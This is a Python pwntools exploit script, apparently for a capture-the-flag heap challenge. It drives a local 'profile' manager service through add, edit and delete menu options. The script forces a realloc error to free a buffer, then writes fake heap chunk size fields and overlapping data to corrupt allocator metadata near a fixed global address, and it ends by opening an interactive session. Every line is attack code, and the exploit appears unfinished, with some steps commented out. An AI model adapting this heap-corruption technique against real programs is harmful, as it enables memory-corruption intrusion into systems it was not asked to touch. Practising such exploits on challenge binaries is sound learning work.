from pwn import *

context.arch = 'amd64'

host = '127.0.0.1'
port = 8888
r = remote(host, port)

input('Enter')

def add_profile(name, age, len_desc, desc):
    r.recvuntil(':')
    r.sendline(b'1')
    r.recvuntil(':') # name
    payload = name.ljust(0x10, b'\x00') + str(age).encode()
    r.sendline(payload)
    r.recvuntil(':') # age
    r.recvuntil(':') # len_desc
    r.sendline(str(len_desc).encode())
    r.recvuntil(':') # desc
    r.send(desc.ljust(len_desc-1, b'\x00')[:len_desc-1])
    # r.recvuntil('Invalid choice')

def show_profile(idx):
    r.recvuntil(':')
    r.sendline(b'2')
    r.recvuntil(':')
    r.sendline(str(idx).encode())

def edit_profile(idx, name, age, desc):
    r.recvuntil(':')
    r.sendline(b'3')
    r.recvuntil(':') # idx
    r.sendline(str(idx).encode())
    r.recvuntil(':') # name
    payload = name.ljust(0x10, b'\x00') + str(age).encode()
    r.sendline(payload)
    r.recvuntil(':') # age
    r.recvuntil(':') # desc
    r.send(desc)

def edit_profile_free_name(idx):
    r.recvuntil(':')
    r.sendline(b'3')
    r.recvuntil(':')
    r.sendline(str(idx).encode())
    r.recvuntil(':')
    r.sendline(b'\x00')
    r.recvuntil('Realloc Error !')

def delete_profile(idx):
    r.recvuntil(':')
    r.sendline(b'4')
    r.recvuntil(':')
    r.sendline(str(idx).encode())

profile = 0x0000000000602100

add_profile(p64(0xaaaaaaaaaaaaaaaa)*2, 0x1111, 0x90, p64(0x0)*16+p64(0x70)+p64(0x20)) # 0
add_profile(p64(0xbbbbbbbbbbbbbbbb)*2, 0x2222, 0x90, p64(0x1111111111111111)*18) # 1
delete_profile(0)
edit_profile_free_name(1)
edit_profile(1, p64(0xb0), 0x0, p64(0x0))
add_profile(p64(0x0), 0x3333, 0x92, p64(0x0)*16+p64(0x70)+p64(0x20)+p64(0x70)) # 0
# input('Enter')
# add_profile(p64(0x50)+p64(0x0), 0x2222, 0x90, b'dddddddd') # 2

r.interactive()
